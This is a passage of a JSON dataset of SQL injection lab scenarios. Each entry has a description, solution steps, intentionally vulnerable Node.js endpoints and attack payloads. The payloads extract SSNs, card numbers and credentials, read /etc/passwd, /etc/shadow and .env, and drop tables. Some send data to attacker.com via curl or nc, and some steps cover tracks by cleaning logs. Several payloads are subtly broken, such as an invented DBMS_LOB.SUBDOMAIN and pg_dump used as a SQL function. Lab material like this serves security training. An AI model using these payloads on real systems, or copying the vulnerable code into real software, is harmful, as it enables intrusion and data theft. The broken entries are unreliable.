    "srcCode": "app.post('/soap', (req, res) => {\n  const xml = req.rawBody;\n  const id = extractXPath(xml, '//citizen_id');\n  const query = `SELECT * FROM citizens WHERE id='${id}'`;\n  pool.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
    "payloads": [
      "<![CDATA[' UNION SELECT ssn,NULL FROM citizens--]]>",
      "'||(SELECT xmlagg(xmlelement(name data, ssn)) FROM citizens)--"
    ]
  },
  {
    "Lab scenario": "Pharmacy Management System Error-Based SQLi in HAVING Clause",
    "Lab Description": "A medication inventory system generates reports using vulnerable HAVING conditions. The PostgreSQL backend returns verbose type conversion errors containing sensitive data. The application aggregates results from multiple tables but fails to sanitize the 'threshold' parameter. To solve: Extract patient SSNs by forcing mismatched data type errors through controlled CAST operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /reports request with Burp Suite",
      "Inject: HAVING 1=CAST((SELECT ssn FROM patients LIMIT 1) AS INTEGER)--",
      "Analyze error message for full SSN leakage",
      "Automate extraction using recursive CTE expressions",
      "Bypass column masking through multiple error triggers"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/reports', (req, res) => {\n  const threshold = req.body.threshold;\n  const query = `SELECT medication, COUNT(*) FROM prescriptions \n    GROUP BY medication HAVING COUNT(*) > ${threshold}`;\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString());\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "100 UNION SELECT CAST(ssn AS INTEGER) FROM patients--",
      "1=CAST((SELECT current_setting('data_directory')) AS NUMERIC)--"
    ]
  },
  {
    "Lab scenario": "Insurance Claim System UNION-Based SQLi with Type Juggling",
    "Lab Description": "A claims processing portal constructs dynamic UNION queries using unsanitized user input in the 'document_type' parameter. The MySQL backend performs implicit type conversion between JSON and string types. To solve: Bypass column type checks using JSON_ARRAY and extract adjuster credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify injectable parameter through fuzzing with OWASP ZAP",
      "Determine column count using ORDER BY with JSON_LENGTH",
      "Craft payload: medical UNION SELECT JSON_ARRAY(adjuster_id,password) FROM adjusters--",
      "Handle JSON parsing anomalies in claim results",
      "Decode base64-embedded credentials in nested objects"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/claims', (req, res) => {\n  const type = req.query.document_type;\n  const query = `SELECT id, details FROM claims WHERE document_type='${type}' \n    UNION SELECT id, document FROM archived_claims`;\n  pool.query(query, (err, result) => {\n    res.json(result);\n  });\n});",
    "payloads": [
      "medical' UNION SELECT 1,JSON_OBJECT('user',adjuster,'pass',password) FROM adjusters--",
      "dental' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Second-Order SQLi in Product Reviews",
    "Lab Description": "A product review system stores unsanitized user comments that later get used in inventory management SQL queries. The Node.js backend escapes output but not storage. To solve: Poison the review system with delayed payloads that trigger during stock reconciliation cron jobs.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit review with payload: '||(SELECT pg_sleep(10) FROM products)--",
      "Monitor cron job execution timing via server logs",
      "Construct payload to copy database to public directory",
      "Access stolen DB copy via /static/backup.sql",
      "Cover tracks through VACUUM and log rotation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/reviews', (req, res) => {\n  const review = req.body.text;\n  const query = `INSERT INTO reviews (product_id, text) \n    VALUES (${req.params.id}, '${review}')`;\n  pool.query(query);\n  res.redirect('/product');\n});",
    "payloads": [
      "Great product!'||(SELECT pg_dump('public')::text)--",
      "Awesome!'||(COPY products TO PROGRAM 'nc attacker.com 4444')--"
    ]
  },
  {
    "Lab scenario": "Telemedicine Platform JSON Path SQLi in Patient Search",
    "Lab Description": "A patient lookup feature uses JSONB path expressions in PostgreSQL with unsanitized input. The system allows path traversal via lateral joins. To solve: Extract mental health records by abusing jsonb_to_recordset function in WHERE clause.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable JSON path parameter through fuzzing",
      "Escape JSON context using @? operator: ' || (SELECT jsonb_build_object('data', notes))--",
      "Use lateral joins to access adjacent tables",
      "Bypass field-level encryption through memory inspection",
      "Decrypt results using leaked AWS KMS credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const path = req.body.jsonPath;\n  const query = `SELECT * FROM patients \n    WHERE metadata @? '${path}'::jsonpath`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "$..* ? (@.sensitive == true)",
      "lax $.** ! (@.redacted == true)"
    ]
  },
  {
    "Lab scenario": "Banking Transaction Audit System - UNION-Based SQLi in CSV Export",
    "Lab Description": "A financial auditing feature generates CSV reports using unsanitized input in ORDER BY clauses. The Oracle backend allows UNION injection through numeric column manipulation. Error messages reveal full query structure but are masked in production. To solve: Extract SWIFT codes from international_transfers table while maintaining column type consistency and bypassing CSV escaping mechanisms.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /audit/export request with Burp Suite",
      "Identify injectable parameter: sort=transaction_date",
      "Determine column count: ' ORDER BY 7-- (throws error at 8)",
      "Craft type-compatible payload: ' UNION SELECT NULL,swift_code,NULL,NULL,NULL,NULL,NULL FROM international_transfers--",
      "Bypass CSV encapsulation using CHR(9) tab separation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/audit/export', (req, res) => {\n  const sortColumn = req.body.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sortColumn}`;\n  // Vulnerable CSV generation\n  oracle.execute(query, (err, result) => {\n    const csv = result.rows.map(r => Object.values(r).join(',')).join('\\n');\n    res.attachment('report.csv').send(csv);\n  });\n});",
    "payloads": [
      "transaction_date UNION SELECT NULL,swift_code,NULL,NULL,NULL,NULL,NULL FROM international_transfers--",
      "amount UNION SELECT NULL,TO_CHAR(DBMS_LOB.SUBDOMAIN(secret_doc,1000,1)),NULL,NULL,NULL,NULL,NULL FROM internal_docs--"
    ]
  },
  {
    "Lab scenario": "CMS Time-Based SQLi in User Registration",
    "Lab Description": "The user registration form stores unsanitized input used in password reset emails. The MySQL backend allows time-based injection through delayed query execution. To solve: Extract administrator password hash through conditional SLEEP operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register user with payload: ' OR IF(ASCII(SUBSTR(password,1,1))>97, SLEEP(3), 0)--",
      "Measure response times with Burp Suite's Repeater",
      "Automate extraction using Python requests and timing analysis",
      "Crack bcrypt hash using Hashcat",
      "Login with compromised credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const email = req.body.email;\n  const query = `INSERT INTO users (email) VALUES ('${email}')`;\n  console.debug('Raw query:', query); // Verbose logging\n  pool.query(query);\n  res.send('Confirmation email sent');\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(5), 0)--",
      "' XOR (SELECT 1 FROM (SELECT SLEEP(5))slowQuery)--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Error-Based SQLi in GROUP BY",
    "Lab Description": "Patient statistics dashboard leaks PostgreSQL errors through vulnerable GROUP BY clause. The application displays full query syntax in debug mode. To solve: Extract medical record IDs using type conversion errors and CTE injections.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept /stats request with Burp Suite",
      "Trigger error: ' GROUP BY CAST((SELECT ssn FROM patients) AS INTEGER)--",
      "Extract sensitive data from verbose errors",
      "Bypass column masking using multiple error triggers",
      "Disable debug mode through parameter manipulation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/stats', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT ${group}, COUNT(*) FROM patients GROUP BY ${group}`;\n  console.error('Failed query:', query); // Error leakage\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString());\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "CASE WHEN 1=1 THEN diagnosis ELSE CAST((SELECT ssn) AS INTEGER) END--",
      "CAST((SELECT current_database()) AS INTEGER)"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Boolean-Based SQLi in Search",
    "Lab Description": "Product search feature returns different HTTP status codes based on query truthiness. The SQLite backend allows boolean inference through response variation. To solve: Extract credit card numbers through binary search character extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /search with OWASP ZAP",
      "Identify boolean trigger: ' OR 1=1 AND 'a'='a",
      "Automate with sqlmap: sqlmap -r request.txt --technique=B",
      "Brute-force PAN using bitwise operations",
      "Validate cards through payment API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const term = req.body.query;\n  const query = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM payments WHERE SUBSTR(pan,1,1)='4')=1--",
      "' AND (SELECT LENGTH(pan) FROM payments)=16--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform JWT-SQLi in Profile Load",
    "Lab Description": "User profile endpoint uses JWT claims directly in SQL queries. The application allows JWT algorithm none and has broken signature validation. To solve: Forge admin token and extract private messages through UNION attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io",
      "Modify 'sub' claim to: ' UNION SELECT message FROM inbox--",
      "Sign with 'none' algorithm",
      "Bypass CSRF protection using CORS misconfiguration",
      "Extract messages from API response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM users WHERE id='${userId}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,message,NULL FROM inbox--",
      "'||(SELECT group_concat(message) FROM inbox)--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform UNION-Based SQLi in Product Filter",
    "Lab Description": "The product search feature directly concatenates user input into a WHERE clause with no parameterization. The MySQL backend returns verbose errors containing database structure details. The application executes: SELECT * FROM products WHERE category = '${input}' AND status = 1. To solve: Extract customer credit card numbers through UNION attacks while bypassing column type restrictions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /products?category=electronics with Burp Suite",
      "Determine column count using ORDER BY 6--",
      "Identify numeric columns through error analysis",
      "Craft payload: ' UNION SELECT NULL,pan,NULL,NULL,NULL,NULL FROM payments--",
      "Bypass WAF using HTML entity encoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT id,name,price FROM products WHERE category = '${category}'`;\n  console.error('Query failed:', query); // Error leakage\n  pool.query(query, (err, result) => {\n    res.json(result);\n  });\n});",
    "payloads": [
      "electronics' UNION SELECT 1,pan,3,4,5,6 FROM payments--",
      "' UNION SELECT NULL,@@version,NULL,NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "Government Portal Boolean-Blind SQLi in Document Search",
    "Lab Description": "The public records search feature uses unsanitized input in a HAVING clause with identical 200/404 responses. The PostgreSQL backend allows boolean inference through response existence checks. The application executes: SELECT doc_id FROM archives GROUP BY doc_id HAVING ${input}. To solve: Extract classified document titles through binary search character extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz HAVING parameter with OWASP ZAP",
      "Identify boolean trigger: ' OR 1=1 AND '1'='1",
      "Automate with sqlmap: sqlmap -u ... --technique=B --dbms=PostgreSQL",
      "Brute-force titles using SUBSTR and ASCII comparisons",
      "Reconstruct documents from extracted fragments"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT doc_id FROM archives GROUP BY doc_id HAVING ${filter}`;\n  pool.query(query, (err, result) => {\n    res.status(result.rowCount > 0 ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT SUBSTR(title,1,1) FROM classified_docs)='T'",
      "EXISTS(SELECT 1 FROM restricted WHERE clearance_level > 5)"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Second-Order SQLi in Comments",
    "Lab Description": "Comment storage system escapes output but not input validation, allowing second-order injection in analytics reports. The application executes: INSERT INTO comments (text) VALUES ('${input}') and later SELECT * FROM comments WHERE ${reportFilter}. To solve: Poison comment system to execute malicious payloads during report generation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Post comment: '||(SELECT CURRENT_USER))--",
      "Wait for daily report generation cron job",
      "Exploit time-delayed payload execution",
      "Exfiltrate OAuth tokens through DNS subdomains",
      "Clean logs through parameter tampering"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const text = req.body.text;\n  const query = `INSERT INTO comments (text) VALUES ('${text}')`;\n  console.debug('New comment:', query); // Verbose logging\n  pool.query(query);\n  res.send('Comment posted');\n});",
    "payloads": [
      "'||(COPY (SELECT * FROM oauth_tokens) TO PROGRAM 'curl https://attacker.com?exfil=$(data)'--",
      "'||(SELECT pg_sleep(10) FROM users)--"
    ]
  },
  {
    "Lab scenario": "Education Platform Error-Based SQLi in Gradebook",
    "Lab Description": "Online gradebook system leaks MySQL errors through vulnerable GROUP BY clause. The application executes: SELECT student_id FROM grades GROUP BY ${input}. To solve: Extract hashed passwords through type conversion errors and UNION payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept POST /gradebook request with Burp Suite",
      "Trigger error: GROUP BY CAST((SELECT password FROM admins) AS INTEGER)--",
      "Extract bcrypt hashes from error messages",
      "Bypass column count restrictions using NULL padding",
      "Crack hashes using rainbow tables"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/gradebook', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT student_id FROM grades GROUP BY ${group}`;\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.sqlMessage); // Error leakage\n    else res.json(result);\n  });\n});",
    "payloads": [
      "student_id UNION SELECT NULL,password,NULL FROM admins--",
      "CAST((SELECT email FROM students) AS UNSIGNED)"
    ]
  },
  {
    "Lab scenario": "Shipping Logistics UNION SQLi in Tracking API",
    "Lab Description": "Package tracking system incorporates user input directly into ORDER BY clauses. The application executes: SELECT * FROM shipments ORDER BY ${input}. To solve: Extract sensitive customer addresses through UNION attacks with explicit type casting.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /track?sort=status with Postman",
      "Determine column count using incremental ORDER BY",
      "Identify VARCHAR columns through NULL replacement",
      "Craft payload: status UNION SELECT NULL,address,NULL FROM customers--",
      "Bypass WAF using multiline comments"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/track', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT id, status FROM shipments ORDER BY ${sort}`;\n  console.log('Tracking query:', query); // Verbose logging\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "status UNION SELECT NULL,CONCAT(name,': ',address),NULL FROM customers--",
      "id UNION SELECT NULL,pg_read_file('/etc/shadow'),NULL--"
    ]
  },
  {
    "Lab scenario": "Smart Home Controller JWT-SQLi in Device Management",
    "Lab Description": "Device control API uses JWT claims directly in SQL queries with broken signature validation. The application executes: SELECT * FROM devices WHERE owner = '${jwt.sub}'. To solve: Forge admin JWT and takeover all smart devices.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Decode JWT using jwt.io",
      "Modify sub claim to: ' UNION SELECT 1,'admin','*' FROM users--",
      "Sign with 'none' algorithm",
      "Bypass CSRF protection using CORS misconfig",
      "Execute mass device reset command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM devices WHERE owner = '${userId}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT 1,device_id,'admin' FROM devices--",
      "'||(SELECT group_concat(password) FROM users)--"
    ]
  },
  {
    "Lab scenario": "Voting System - Error-Based SQL Injection in Poll Results",
    "Lab Description": "An online voting application displays poll results aggregated via SQL. The `poll_id` is taken from a GET parameter and directly injected into a GROUP BY query without sanitization. By leveraging error-based SQL injection with improper type casting, an attacker can extract database names and user tables using verbose PostgreSQL error messages. This lab demonstrates how misusing numeric casting in error messages can lead to data disclosure.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the endpoint: /polls/results?poll_id=1",
      "Inject: poll_id=1::int OR CAST((SELECT version()) AS int)--",
      "Read the error message to determine database version",
      "Enumerate tables via error extraction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/polls/results', (req, res) => {\n  const pollId = req.query.poll_id;\n  const query = `SELECT option, COUNT(*) FROM votes WHERE poll_id = ${pollId} GROUP BY option`;\n  pool.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "1::int OR CAST((SELECT current_user) AS int)--",
      "1 OR CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--"
    ]
  },
  {
    "Lab scenario": "CRM Application - Time-Based SQL Injection in Login Form",
    "Lab Description": "A Customer Relationship Management (CRM) application has a vulnerable login system. Although errors are suppressed, an attacker can infer SQL injection by measuring time delays. This lab uses PostgreSQL's `pg_sleep` to demonstrate blind SQL injection through the username field, allowing attackers to brute-force credentials using conditional delays.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit login form with payload: admin' OR (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
      "Measure server response time",
      "Automate using sqlmap: `sqlmap -u /login -p username --technique=T --delay=5`",
      "Infer data via bitwise delay exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  pool.query(query, (err, result) => {\n    if (result && result.rows.length > 0) {\n      res.send('Login success');\n    } else {\n      res.send('Invalid credentials');\n    }\n  });\n});",
    "payloads": [
      "admin' OR 1=1--",
      "admin' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
    ]
  },
  {
    "Lab scenario": "Payment Processor - Boolean-Blind SQLi in Transaction Logs",
    "Lab Description": "A payment platform allows filtering logs via a query string parameter. The system only returns a status of 'true' or 'false', but the backend query is injectable. Attackers can infer sensitive payment info like card digits by manipulating boolean logic within the WHERE clause and observing the true/false behavior.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send request to /transactions/logs?filter=id=1 AND (SELECT substring(card_no,1,1)='4')",
      "Observe whether results exist (true) or not (false)",
      "Use binary search to extract full credit card numbers",
      "Automate using sqlmap or custom Python scripts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions/logs', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM payments WHERE ${filter}`;\n  pool.query(query, (err, result) => {\n    res.json({ found: result.rows.length > 0 });\n  });\n});",
    "payloads": [
      "1=1 AND substring((SELECT card_no FROM payments LIMIT 1),1,1)='4'--",
      "1=1 AND ascii(substring((SELECT card_no FROM payments LIMIT 1),1,1))>50--"
    ]
  },
  {
    "Lab scenario": "IoT Device Dashboard - SQLi via MQTT Message Injection",
    "Lab Description": "IoT telemetry data sent over MQTT is processed into a PostgreSQL database. The message handler lacks proper validation, allowing SQL injection via MQTT payloads. This lab focuses on out-of-band time-based attacks and showcases how IoT protocols can become attack surfaces.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept MQTT traffic (topic: telemetry/data)",
      "Publish payload: {'device_id': 'dev1'; SELECT pg_sleep(5)--', 'value': 20}",
      "Measure backend delay",
      "Extract data conditionally through timed responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "mqttClient.on('message', (topic, message) => {\n  const data = JSON.parse(message);\n  const query = `INSERT INTO telemetry (device_id, reading) VALUES ('${data.device_id}', ${data.value})`;\n  pool.query(query);\n});",
    "payloads": [
      "'; SELECT pg_sleep(5)--",
      "'; SELECT CASE WHEN (SELECT COUNT(*) FROM devices)>0 THEN pg_sleep(5) END--"
    ]
  },
  {
    "Lab scenario": "Support Portal - Second-Order SQL Injection in Ticket System",
    "Lab Description": "The application stores user-submitted tickets that are later used in admin SQL queries. The stored malicious data becomes effective only after a separate action triggers it, demonstrating second-order SQL injection. The attacker poisons input via the ticket submission page and waits for it to be processed in a vulnerable report generation feature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a ticket with subject: test'); DROP TABLE tickets;--",
      "Wait for admin to generate daily summary",
      "Confirm impact by observing missing records",
      "Modify payload to exfiltrate data instead of destruction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/submit_ticket', (req, res) => {\n  const { subject, message } = req.body;\n  const query = `INSERT INTO tickets (subject, message) VALUES ('${subject}', '${message}')`;\n  pool.query(query);\n  res.send('Ticket submitted');\n});\n\napp.get('/admin/reports', (req, res) => {\n  const query = `SELECT * FROM tickets WHERE subject LIKE '%${req.query.search}%'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "'); DROP TABLE tickets;--",
      "'); INSERT INTO secrets SELECT * FROM users;--"
    ]
  },
  {
    "Lab scenario": "SaaS Analytics - SQLi in Export Feature Using Stacked Queries",
    "Lab Description": "The export CSV feature builds a dynamic query based on filters and directly executes it. Attackers can append stacked queries using semicolons to create new tables, copy data, or trigger remote command execution (PostgreSQL COPY FROM PROGRAM). This lab simulates privilege escalation via SQLi.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Request: /export?filter=1; COPY users TO PROGRAM 'curl http://attacker.com/exfil.txt'--",
      "Trigger the endpoint and monitor attacker server",
      "Validate stolen credentials via crafted CSV output"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM usage WHERE ${filter}) TO STDOUT WITH CSV`;\n  pool.query(query);\n  res.send('Exported');\n});",
    "payloads": [
      "1; DROP TABLE usage;--",
      "1; COPY users TO PROGRAM 'curl http://attacker.com?data=$(cat /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "Mobile App Backend - JSON-Based SQLi via REST API",
    "Lab Description": "A mobile app sends JSON bodies to an API endpoint that joins JSON values into SQL filters. An attacker can exploit this by inserting SQL logic within array elements, bypassing filters and leaking authentication tokens. The vulnerability stems from improper concatenation of JSON strings into SQL clauses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send POST to /api/filter with body: { \"filters\": [\"1=1 UNION SELECT token,NULL FROM auth_tokens--\"] }",
      "Check API response for token leaks",
      "Automate with script that manipulates filter elements"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/filter', (req, res) => {\n  const filters = req.body.filters.join(' OR ');\n  const query = `SELECT * FROM users WHERE ${filters}`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "\"1=1 UNION SELECT token,NULL FROM auth_tokens--\"",
      "\"1=1 OR EXISTS(SELECT * FROM users)--\""
    ]
  },
  {
    "Lab scenario": "Blog Engine - Union SQLi via Tag Search",
    "Lab Description": "The blog application offers tag-based article filtering. Tags are concatenated into a WHERE clause with no sanitization, leading to a UNION-based SQL injection vulnerability. An attacker can extract full user records by appending a secondary query into the tag filter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access: /articles?tag=tech' UNION SELECT username,password FROM users--",
      "Verify the presence of user credentials in response",
      "Use different UNION column count if needed"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/articles', (req, res) => {\n  const tag = req.query.tag;\n  const query = `SELECT * FROM articles WHERE tag='${tag}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "tech' UNION SELECT username,password FROM users--",
      "dev' OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Admin Panel - SQLi via Cookie Injection",
    "Lab Description": "The admin dashboard uses cookie-based authentication, which is parsed and inserted into a query without sanitization. A malicious user can modify their cookie value to execute SQL injection and access admin-only resources or dump data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set Cookie: auth=admin' OR '1'='1",
      "Access /admin endpoint and confirm access",
      "Use payload to UNION SELECT table names"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/admin', (req, res) => {\n  const auth = req.cookies.auth;\n  const query = `SELECT * FROM admins WHERE username='${auth}'`;\n  pool.query(query, (err, result) => {\n    if (result.rows.length > 0) {\n      res.send('Admin Access');\n    } else {\n      res.status(403).send('Access Denied');\n    }\n  });\n});",
    "payloads": [
      "admin' OR '1'='1--",
      "' UNION SELECT NULL,password FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQLi in CSV Export Order Clause",
    "Lab Description": "A financial report export feature in a banking portal directly concatenates user-controlled sorting parameters into an ORDER BY clause within a PostgreSQL COPY command. The application leaks verbose errors containing sensitive database metadata. Attackers can exploit this to exfiltrate account balances and transaction histories by bypassing column type checks through explicit casting and UNION payloads. The vulnerability stems from improper input sanitization and debug-mode error reporting in production.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept POST /export CSV generation request using Burp Suite",
      "2. Identify injectable 'sort' parameter: sort=amount",
      "3. Determine column count: ' ORDER BY 7-- (Observe error at ORDER BY 8)",
      "4. Craft payload: amount UNION SELECT NULL,CAST(balance AS TEXT),NULL,NULL,NULL,NULL FROM accounts--",
      "5. Bypass CSV encapsulation using CHR(9) tab characters",
      "6. Parse stolen data from corrupted CSV file headers"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export', (req, res) => {\n  const sort = req.body.sort || 'date';\n  const query = `COPY (\n    SELECT id,date,amount,recipient\n    FROM transactions\n    ORDER BY ${sort}\n  ) TO STDOUT CSV HEADER`;\n\n  pool.query(query, (err) => {\n    if(err) {\n      console.error(`Full error: ${err.stack}`); // Debug leakage\n      res.status(500).send(err.message);\n    } else {\n      res.attachment('report.csv');\n    }\n  });\n});",
    "payloads": [
      "amount UNION SELECT NULL,CAST(CURRENT_USER AS TEXT),NULL,NULL,NULL,NULL--",
      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform JSON Array Injection with Type Confusion",
    "Lab Description": "A product search API processes JSON arrays containing filter conditions without type validation. Attackers can bypass parameterized queries by nesting objects and exploiting SQLite's dynamic typing system. This lab demonstrates credential extraction through type juggling and JSON aggregation functions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Set Content-Type: application/json",
      "2. Craft payload: {\"filters\":[{\"field\":\"1\",\"value\":\"1' UNION SELECT json_group_array(username||':'||password) FROM users--\"}]}",
      "3. Bypass WAF using Unicode escapes: \\u0027",
      "4. Parse concatenated credentials from JSON response",
      "5. Crack hashes using John the Ripper"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.filters\n    .map(f => `${f.field}=${f.value}`)\n    .join(' AND ');\n\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT sqlite_version(),1,1--\"}]",
      "[{\"field\":\"price\",\"value\":\"0 OR 1=1 UNION SELECT LOAD_EXTENSION('exploit.so'),NULL,NULL--\"}]"
    ]
  },
  {
    "Lab scenario": "Social Media Platform JWT-SQLi in Notifications",
    "Lab Description": "A notification system inserts JWT 'sub' claims directly into SQL queries without validation. Attackers can forge tokens with UNION payloads to hijack user sessions and exfiltrate private messages through malformed JSON responses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Decode JWT using jwt.io",
      "2. Modify 'sub' to: ' UNION SELECT message,user FROM inbox--",
      "3. Sign with 'none' algorithm",
      "4. Bypass CSRF tokens using CORS misconfiguration",
      "5. Parse messages from notification API response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/notifications', (req, res) => {\n  const userId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM notifications WHERE user_id='${userId}'`;\n\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,CONCAT(user,':',password) FROM users--",
      "'||(SELECT pg_read_file('/home/app/.env'))--"
    ]
  },
  {
    "Lab scenario": "Telemedicine Platform XML/SQL Polyglot Injection",
    "Lab Description": "A patient portal processes XML input containing CDATA-wrapped SQL fragments. Attackers can bypass XML entity encoding through hybrid polyglot payloads to extract sensitive medical records using PostgreSQL's xmlagg() function.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Wrap payload in CDATA: <![CDATA[' UNION SELECT xmlagg(XMLELEMENT(...)) FROM records--]]>",
      "2. Bypass XML validation using external entities",
      "3. Parse exfiltrated data from malformed XML responses",
      "4. Convert Base64-encoded results to PDF reports"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/telemed', (req, res) => {\n  const xml = req.rawBody;\n  const patientId = extractXPath(xml, '//patient/id');\n  const query = `SELECT * FROM records WHERE patient_id='${patientId}'`;\n\n  pool.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
    "payloads": [
